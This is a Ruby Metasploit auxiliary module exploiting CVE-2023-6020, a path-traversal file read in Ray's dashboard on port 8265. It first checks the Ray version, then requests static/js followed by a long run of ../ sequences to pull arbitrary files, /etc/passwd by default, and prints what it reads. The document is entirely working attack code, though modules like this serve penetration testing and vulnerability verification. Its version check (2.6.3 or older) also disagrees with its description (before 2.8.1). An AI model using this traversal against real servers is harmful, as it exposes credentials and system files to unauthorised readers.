##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ray static arbitrary file read',
        'Description' => %q{
          Ray before 2.8.1 is vulnerable to a local file inclusion.
        },
        'Author' => [
          'byt3bl33d3r <marcello@protectai.com>', # Python Metasploit module
          'danmcinerney <dan@protectai.com>',     # Python Metasploit module
          'Takahiro Yokoyama'                     # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-6020'],
          ['URL', 'https://huntr.com/bounties/83dd8619-6dc3-4c98-8f1b-e620fedcd1f6/'],
          ['URL', 'https://github.com/protectai/ai-exploits/tree/main/ray']
        ],
        'DisclosureDate' => '2023-11-15',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ IOC_IN_LOGS, ],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8265),
        OptString.new('FILEPATH', [ true, 'File to read', '/etc/passwd'])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api/version')
    })
    return Exploit::CheckCode::Unknown unless res && res.code == 200

    ray_version = res.get_json_document['ray_version']

    return Exploit::CheckCode::Unknown unless ray_version

    return Exploit::CheckCode::Safe unless Rex::Version.new(ray_version) <= Rex::Version.new('2.6.3')

    file_content = lfi('/etc/passwd')
    return Exploit::CheckCode::Vulnerable unless file_content.nil?

    Exploit::CheckCode::Appears
  end

  def lfi(filepath)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "static/js/../../../../../../../../../../../../../..#{filepath}")
    })
    return unless res && res.code == 200

    res.body
  end

  def run
    file_content = lfi(datastore['FILEPATH'])
    fail_with(Failure::Unknown, 'Failed to execute LFI') unless file_content
    print_good("#{datastore['FILEPATH']}\n#{file_content}")
  end

end
